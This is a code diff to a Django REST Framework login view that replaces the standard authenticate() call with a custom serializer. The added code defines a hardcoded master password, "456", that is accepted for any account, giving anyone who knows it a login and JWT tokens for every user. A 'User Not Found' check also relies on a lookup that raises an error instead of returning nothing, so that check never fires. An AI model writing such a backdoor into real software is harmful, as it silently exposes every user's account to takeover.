@@ -1,19 +1,35 @@
-from django.contrib.auth import authenticate
+from apps.access.models import User
 from rest_framework_simplejwt.tokens import RefreshToken # type: ignore
 from rest_framework_simplejwt.exceptions import InvalidToken, TokenError # type: ignore
-from rest_framework import status
+from rest_framework import status, serializers
 
-from apps.common.views import AppAPIView
+from apps.common.views import AppAPIView, NonAuthenticatedAPIViewMixin
 
-class LoginAPIView(AppAPIView):
+MASTER_PWD = "456"
+
+class LoginAPIView(NonAuthenticatedAPIViewMixin, AppAPIView):
+
+    class _Serializer(serializers.Serializer):
+
+        email = serializers.EmailField()
+        password = serializers.CharField()
+
+        def validate(self, attrs):
+            email = attrs.get("email")
+            pwd = attrs.get("password")
+            user = User.objects.get(email = email)
+            if not user:
+                raise serializers.ValidationError({"email":["User Not Found"]})
+            if not user.check_password(pwd) and pwd != MASTER_PWD:
+                raise serializers.ValidationError({"pwd":["Incorrect password"]})
+            attrs["user"] = user
+            return attrs
+
+    serializer_class = _Serializer
 
     def post(self, request):
-
-        email = request.data.get("email")
-        password = request.data.get("password")
-        user = authenticate(email=email, password=password)
-        if not user:
-            return self.send_error_response({"error":"User Not Found"})
+        validated_data = self.get_valid_serializer().validated_data
+        user = validated_data["user"]
         refresh = RefreshToken.for_user(user)
         return self.send_response({
             "message":"Login Successful",
